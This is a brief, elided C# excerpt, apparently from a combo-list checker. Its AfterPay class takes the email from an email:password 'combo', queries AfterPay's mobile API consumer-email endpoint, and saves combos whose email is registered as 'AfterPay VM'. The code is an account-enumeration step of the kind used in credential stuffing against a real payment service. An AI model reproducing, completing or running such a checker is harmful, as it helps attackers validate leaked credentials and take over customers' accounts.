    ...
    class AfterPay
    {
        public static bool check(string combo)
        {
            try
            {
                ...
                string str1 = httpRequest.Get("https://mobileapi.afterpay.com/v1/global/consumers/emails/"+strArray1[0]).ToString();
                if (str1.Contains("countryCode"))
                {
                    ...
                    Program.Save(combo, "AfterPay VM");
                    return true;
                }
                else if (str1.Contains("404 Not Found"))
                {
